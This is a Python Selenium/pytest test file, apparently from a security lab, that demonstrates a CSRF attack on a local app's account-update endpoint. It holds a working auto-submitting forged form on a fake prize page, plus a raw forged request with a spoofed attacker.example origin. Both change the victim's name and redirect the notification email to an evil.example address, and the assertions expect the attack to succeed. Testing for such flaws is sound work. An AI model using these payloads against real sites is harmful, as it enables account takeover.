import http.server
import socketserver
import threading
import time
import uuid

import pytest
import requests
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

from conftest import FRONTEND_URL, BACKEND_URL


HTML = """<!doctype html>
<html><head><title>Wygrales nagrode!</title></head>
<body>
  <h1>Klinij aby odebrac nagrode</h1>
  <form id="csrf" action="{backend}/api/account/update" method="POST" enctype="application/x-www-form-urlencoded">
    <input type="hidden" name="fullName" value="PWNED BY ATTACKER" />
    <input type="hidden" name="notificationsEmail" value="attacker@evil.example" />
    <input type="hidden" name="address" value="Attacker street 1" />
  </form>
  <script>document.getElementById('csrf').submit();</script>
</body></html>
"""


def start_attacker_server(html):
    data = html.encode("utf-8")

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)

        def log_message(self, *args, **kwargs):
            return

    httpd = socketserver.TCPServer(("127.0.0.1", 0), Handler)
    port = httpd.server_address[1]
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    return httpd, "http://127.0.0.1:" + str(port) + "/attack.html"


@pytest.fixture
def attacker_url():
    httpd, url = start_attacker_server(HTML.format(backend=BACKEND_URL))
    yield url
    httpd.shutdown()
    httpd.server_close()


def ui_login(driver, email, password):
    driver.get(FRONTEND_URL + "/login")
    WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.CSS_SELECTOR, "[data-testid='login-form']"))
    )
    driver.find_element(By.CSS_SELECTOR, "[data-testid='login-email']").send_keys(email)
    driver.find_element(By.CSS_SELECTOR, "[data-testid='login-password']").send_keys(password)
    driver.find_element(By.CSS_SELECTOR, "[data-testid='login-submit']").click()
    WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.CSS_SELECTOR, "[data-testid='account-form']"))
    )


def read_account(driver):
    return {
        "email": driver.find_element(By.CSS_SELECTOR, "[data-testid='account-email']").text,
        "fullName": driver.find_element(By.CSS_SELECTOR, "[data-testid='account-fullName']").get_attribute("value"),
        "address": driver.find_element(By.CSS_SELECTOR, "[data-testid='account-address']").get_attribute("value"),
        "notificationsEmail": driver.find_element(
            By.CSS_SELECTOR, "[data-testid='account-notificationsEmail']"
        ).get_attribute("value"),
    }


def test_atak_csrf_z_aktywna_sesja(driver, registered_user, attacker_url):
    ui_login(driver, registered_user["email"], registered_user["password"])
    before = read_account(driver)
    assert before["notificationsEmail"] == registered_user["email"]
    assert before["fullName"] == registered_user["fullName"]

    main_tab = driver.current_window_handle
    driver.execute_script("window.open(arguments[0], '_blank');", attacker_url)
    driver.switch_to.window(driver.window_handles[-1])
    time.sleep(2)
    driver.close()
    driver.switch_to.window(main_tab)

    driver.get(FRONTEND_URL + "/account")
    WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.CSS_SELECTOR, "[data-testid='account-form']"))
    )
    after = read_account(driver)

    assert after["notificationsEmail"] == "attacker@evil.example"
    assert after["fullName"] == "PWNED BY ATTACKER"
    assert after["address"] == "Attacker street 1"


def test_atak_csrf_z_obcym_origin(registered_user):
    s = requests.Session()
    r = s.post(
        BACKEND_URL + "/api/login",
        json={"email": registered_user["email"], "password": registered_user["password"]},
        timeout=5,
    )
    assert r.status_code == 200
    sid = s.cookies.get("sid")
    assert sid

    forged = requests.post(
        BACKEND_URL + "/api/account/update",
        data={
            "fullName": "RawCSRF",
            "notificationsEmail": "raw@evil.example",
            "address": "Raw lane 7",
        },
        headers={
            "Origin": "https://attacker.example",
            "Referer": "https://attacker.example/page",
        },
        cookies={"sid": sid},
        timeout=5,
    )
    assert forged.status_code == 200
    body = forged.json()
    assert body["user"]["fullName"] == "RawCSRF"
    assert body["user"]["notificationsEmail"] == "raw@evil.example"


def test_brak_sesji_blokuje_atak(attacker_url, reset_backend):
    s = uuid.uuid4().hex[:8]
    email = "victim_" + s + "@example.com"
    pwd = "VictimPass1"
    requests.post(
        BACKEND_URL + "/api/register",
        json={"email": email, "password": pwd, "fullName": "Victim"},
        timeout=5,
    ).raise_for_status()

    r = requests.post(
        BACKEND_URL + "/api/account/update",
        data={"fullName": "NoSession", "notificationsEmail": "x@x.com"},
        timeout=5,
    )
    assert r.status_code == 401

    sess = requests.Session()
    sess.post(
        BACKEND_URL + "/api/login",
        json={"email": email, "password": pwd},
        timeout=5,
    ).raise_for_status()
    state = sess.get(BACKEND_URL + "/api/account", timeout=5).json()
    assert state["fullName"] == "Victim"
    assert state["notificationsEmail"] == email
